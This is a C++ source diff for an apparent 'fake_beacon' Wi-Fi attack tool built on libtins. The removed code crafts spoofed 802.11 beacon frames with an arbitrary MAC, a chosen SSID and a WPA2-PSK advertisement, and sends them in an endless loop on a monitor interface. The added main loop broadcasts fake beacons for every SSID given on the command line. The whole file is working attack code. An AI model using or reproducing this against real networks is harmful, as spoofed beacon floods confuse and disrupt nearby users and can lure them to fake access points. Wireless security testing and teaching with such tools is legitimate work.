@@ -1,60 +1,39 @@
 #include <iostream>
-#include <tins/tins.h>
-#include <unistd.h>
+#include <unordered_map>
+#include "attackBeacon.h"
+#include "networkInfo.h"
 
 using namespace std;
-using namespace Tins;
-
-class attackBeacon{
-public:
-    attackBeacon(){}
-    ~attackBeacon(){}
-    void sendBeacon();
-    void makeBeacon();
-
-private:
-    Dot11Beacon beacon;
-    RadioTap tap;
-    PacketSender sender;
-};
-
-void attackBeacon::makeBeacon()
-{
-    // Make this a broadcast frame. Note that Dot11::BROADCAST
-    // is just the same as "ff:ff:ff:ff:ff:ff"
-    this->beacon.addr1(Dot11::BROADCAST);
-    // We'll set the source address to some arbitrary address
-    this->beacon.addr2("00:01:02:03:04:05");
-    // Set the bssid, to the same one as above
-    this->beacon.addr3(beacon.addr2());
-
-    // Let's add an ssid option
-    this->beacon.ssid("libtins");
-    // Our current channel is 8
-    this->beacon.ds_parameter_set(8);
-    // This is our list of supported rates:
-    this->beacon.supported_rates({ 1.0f, 5.5f, 11.0f });
-
-    // Encryption: we'll say we use WPA2-psk encryption
-    this->beacon.rsn_information(RSNInformation::wpa2_psk());
-    // The beacon's ready to be sent!
-}
-
-void attackBeacon::sendBeacon()
-{
-    while(true){
-        this->tap.inner_pdu(beacon);
-        this->sender.default_interface("mon0");
-        this->sender.send(this->tap);
-        usleep(10000);
-    }
-}
+using namespace spraybeacon;
+using namespace netinfo;
 
 int main(int argc, char *argv[])
 {
-    attackBeacon akb;
-    akb.makeBeacon();
-    akb.sendBeacon();
+    if (argc < 3){
+        fprintf(stderr, "Usage : ./fake_beacon <INTERFACE> <SSID_1> [SSID_2] ...\n");
+        return 0;
+    }
+    else{
+        // check interface
+        networkInfo nif;
+        nif.checkInterface(argv[1]);
+    }
+
+    static unordered_map<string, attackBeacon*>* ssidMap = new unordered_map<string, attackBeacon*>;
+    static unordered_map<string, attackBeacon*>::iterator umapIter;
+    attackBeacon *akb;
+
+    for (int i = 2; i < argc; i++){
+        akb = new attackBeacon(argv[1], argv[i]);
+        akb->makeBeacon();
+        ssidMap->insert(unordered_map<string, attackBeacon*>::value_type(argv[i], akb));
+    }
+
+    while(true){
+        for ( umapIter = ssidMap->begin(); umapIter != ssidMap->end(); umapIter++){
+            umapIter->second->sendBeacon();
+        }
+    }
 
     return 0;
 }
